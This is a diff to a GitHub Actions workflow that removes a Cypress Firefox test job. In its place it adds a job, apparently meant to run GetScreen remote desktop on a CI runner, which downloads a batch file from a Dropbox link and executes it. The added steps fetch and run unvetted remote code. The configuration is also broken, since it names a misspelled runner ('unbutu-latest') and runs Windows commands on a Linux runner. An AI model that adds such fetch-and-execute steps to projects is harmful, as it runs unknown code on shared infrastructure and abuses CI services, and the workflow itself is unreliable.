@@ -1,33 +1,18 @@
-name: example-firefox
+name: GetScreen Unbutu (6H)
+
 on:
-  push:
-    branches:
-      - 'master'
-  pull_request:
   workflow_dispatch:
 
 jobs:
+  build:
+    runs-on: unbutu-latest
 
-  firefox:
-    runs-on: ubuntu-24.04
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=Your GetScreen Mail" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
 
-      - name: Firefox
-        uses: ./
-        timeout-minutes: 9999
-        with:
-          # let's show browser and system info
-          build: npx cypress info
-          working-directory: examples/browser
-          browser: firefox
-
-      # report screenshot size and store the screenshots as test artifacts
-      - uses: actions/upload-artifact@v4
-        with:
-          name: screenshots-in-firefox
-          path: examples/browser/cypress/screenshots
-
-      - run: npx image-size cypress/screenshots/**/*.png
-        working-directory: examples/browser
+      - name: Time Counter
+        run: python time.py
